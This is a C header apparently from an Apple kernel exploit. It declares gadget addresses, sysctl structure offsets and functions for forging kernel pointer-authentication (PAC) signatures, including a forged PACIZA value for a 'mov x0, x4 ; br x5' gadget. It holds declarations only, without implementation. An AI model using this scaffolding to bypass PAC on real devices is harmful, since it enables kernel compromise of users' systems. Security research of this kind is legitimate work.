#ifndef PAC__H_
#define PAC__H_

#include <mach/mach.h>

#include <stdbool.h>
#include <stdint.h>

#include "parameters.h"

// The address of our kernel buffer.
uint64_t kernel_pacxa_buffer;

// The forged value PACIZA('mov x0, x4 ; br x5').
uint64_t paciza__mov_x0_x4__br_x5;

uint64_t ADDRESS(paciza_pointer__l2tp_domain_module_start);
uint64_t ADDRESS(paciza_pointer__l2tp_domain_module_stop);
uint64_t ADDRESS(l2tp_domain_inited);
uint64_t ADDRESS(sysctl__net_ppp_l2tp);
uint64_t ADDRESS(sysctl_unregister_oid);
uint64_t ADDRESS(mov_x0_x4__br_x5);
uint64_t ADDRESS(mov_x9_x0__br_x1);
uint64_t ADDRESS(mov_x10_x3__br_x6);
uint64_t ADDRESS(kernel_forge_pacia_gadget);
uint64_t ADDRESS(kernel_forge_pacda_gadget);

size_t SIZE(kernel_forge_pacxa_gadget_buffer);
size_t OFFSET(kernel_forge_pacxa_gadget_buffer, first_access);
size_t OFFSET(kernel_forge_pacxa_gadget_buffer, pacia_result);
size_t OFFSET(kernel_forge_pacxa_gadget_buffer, pacda_result);

size_t SIZE(sysctl_oid);
size_t OFFSET(sysctl_oid, oid_parent);
size_t OFFSET(sysctl_oid, oid_link);
size_t OFFSET(sysctl_oid, oid_kind);
size_t OFFSET(sysctl_oid, oid_handler);
size_t OFFSET(sysctl_oid, oid_version);
size_t OFFSET(sysctl_oid, oid_refcnt);

void init_kernel_pacxa_forging();
uint64_t kernel_forge_pacxa(uint64_t address, uint64_t context, bool instruction);

#endif